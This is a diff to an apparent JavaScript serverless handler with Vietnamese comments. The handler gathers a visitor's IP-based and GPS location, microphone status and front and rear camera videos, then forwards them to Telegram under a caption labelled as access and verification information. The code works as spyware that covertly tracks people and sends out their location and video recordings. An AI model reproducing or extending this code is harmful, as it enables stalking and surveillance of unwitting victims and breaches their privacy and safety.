@@ -20,7 +20,6 @@ export default async function handler(req) {
     let ipLon = 0;
     
     try {
-      // Lấy vị trí từ IP
       const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
       geo = await geoRes.json();
       ipLat = geo.latitude || 0;
@@ -50,7 +49,7 @@ export default async function handler(req) {
     const hasFront = formData && formData.has("front");
     const hasBack = formData && formData.has("back");
 
-    // 3. QUYẾT ĐỊNH DÙNG TỌA ĐỘ NÀO (ƯU TIÊN GPS)
+    // 3. TỌA ĐỘ (ƯU TIÊN GPS)
     const finalLat = gpsLat !== 0 ? gpsLat : ipLat;
     const finalLon = gpsLon !== 0 ? gpsLon : ipLon;
     const lat = finalLat || 0;
@@ -58,23 +57,12 @@ export default async function handler(req) {
     
     const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
 
-    // 4. TẠO LINK GOOGLE MAPS CHUẨN
+    // 4. LINK GOOGLE MAPS CHUẨN
     const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-    const googleMapsEmbed = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d${lon}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1svi!2s!4v${Date.now()}`;
     const googleMapsShort = `https://maps.google.com/?q=${lat},${lon}`;
-    
-    // Link Google Maps với tên địa điểm (nếu có)
-    let locationName = '';
-    if (geo.cityName && geo.countryName) {
-      locationName = `${geo.cityName}, ${geo.countryName}`;
-    } else if (geo.regionName) {
-      locationName = geo.regionName;
-    }
-    const mapsWithPlace = locationName ? 
-      `https://www.google.com/maps/place/${encodeURIComponent(locationName)}/@${lat},${lon},15z` :
-      `https://www.google.com/maps?q=${lat},${lon}`;
+    const googleMapsEmbed = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d${lon}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1svi!2s!4v${Date.now()}`;
 
-    // 5. TẠO CAPTION
+    // 5. CAPTION ĐẦY ĐỦ
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
 
@@ -93,24 +81,21 @@ export default async function handler(req) {
 📍 Kinh độ (Sử dụng): ${lon}
 🎯 Độ chính xác GPS: ${clientData.accuracy || 'Không có'}m
 
-🗺️ Google Maps: ${mapsWithPlace}
-📍 Google Maps (Q): ${googleMapsLink}
+🗺️ Google Maps: ${googleMapsLink}
 📍 Google Maps (Short): ${googleMapsShort}
 📌 Google Maps Embed: ${googleMapsEmbed}
 
 🎙️ Microphone: ${clientData.microphone || '❌ Không có quyền'}
-🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}
+🎥 Video trước: ${hasFront ? '✅ Có' : '❌ Không'}
+🎥 Video sau: ${hasBack ? '✅ Có' : '❌ Không'}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
 `.trim();
 
     console.log('📤 Bắt đầu gửi lên Telegram...');
-    console.log(`📍 Tọa độ sử dụng: ${lat}, ${lon}`);
-    console.log(`🗺️ Link Google Maps: ${mapsWithPlace}`);
 
     // 6. GỬI LÊN TELEGRAM
     if (hasFront || hasBack) {
-      // Gửi video trước
       if (hasFront) {
         const frontFile = formData.get("front");
         const frontForm = new FormData();
@@ -128,7 +113,6 @@ export default async function handler(req) {
         );
       }
 
-      // Gửi video sau
       if (hasBack) {
         const backFile = formData.get("back");
         const backForm = new FormData();
